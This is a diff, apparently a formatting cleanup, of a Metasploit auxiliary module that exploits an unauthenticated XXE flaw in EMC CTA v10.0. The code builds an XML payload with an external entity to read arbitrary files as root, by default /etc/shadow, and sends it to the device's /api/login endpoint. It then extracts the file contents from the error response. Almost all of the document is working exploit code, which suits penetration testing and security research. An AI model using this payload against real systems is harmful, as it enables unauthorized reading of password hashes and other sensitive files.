@@ -1,34 +1,32 @@
+# frozen_string_literal: true
 # This module requires Metasploit: http://metasploit.com/download
 ##
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'EMC CTA v10.0 Unauthenticated XXE Arbitrary File Read',
-      'Description'    => %q{
-      EMC CTA v10.0 is susceptible to an unauthenticated XXE attack
-      that allows an attacker to read arbitrary files from the file system
-      with the permissions of the root user.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module
-        ],
-      'References'     =>
-        [
-          ['EDB', '32623']
-        ],
-      'DisclosureDate' => 'Mar 31 2014'
-    ))
+                      'Name'           => 'EMC CTA v10.0 Unauthenticated XXE Arbitrary File Read',
+                      'Description'    => %q(
+                      EMC CTA v10.0 is susceptible to an unauthenticated XXE attack
+                      that allows an attacker to read arbitrary files from the file system
+                      with the permissions of the root user.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Brandon Perry <bperry.volatile[at]gmail.com>', # metasploit module
+                        ],
+                      'References'     =>
+                        [
+                          ['EDB', '32623']
+                        ],
+                      'DisclosureDate' => 'Mar 31 2014'))
 
     register_options(
       [
@@ -36,17 +34,17 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('SSL', [true, 'Use SSL', true]),
         OptString.new('SSLVersion', [true, 'SSL version', 'TLS1']),
         OptString.new('TARGETURI', [ true, "Base directory path", '/']),
-        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
-      ], self.class)
+        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
+      ], self.class
+    )
   end
 
   def run
-
     doctype = Rex::Text.rand_text_alpha(6)
     element = Rex::Text.rand_text_alpha(6)
     entity = Rex::Text.rand_text_alpha(6)
 
-    pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
+    pay = %(<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE #{doctype} [
 <!ELEMENT #{element} ANY >
 <!ENTITY #{entity} SYSTEM "file://#{datastore['FILEPATH']}" >]>
@@ -54,21 +52,19 @@ class MetasploitModule < Msf::Auxiliary
 <Username>root</Username>
 <Password>&#{entity};</Password>
 </Request>
-    }
+    )
 
-    res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'api', 'login'),
-      'method' => 'POST',
-      'data' => pay
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'api', 'login'),
+                           'method' => 'POST',
+                           'data' => pay)
 
-    if !res or !res.body
+    if !res || !res.body
       fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way")
     end
 
     file = /For input string: "(.*)"/m.match(res.body)
 
-    if !file or file.length < 2
+    if !file || file.length < 2
       fail_with(Failure::UnexpectedReply, "File was unretrievable. Was it a binary file?")
     end
 
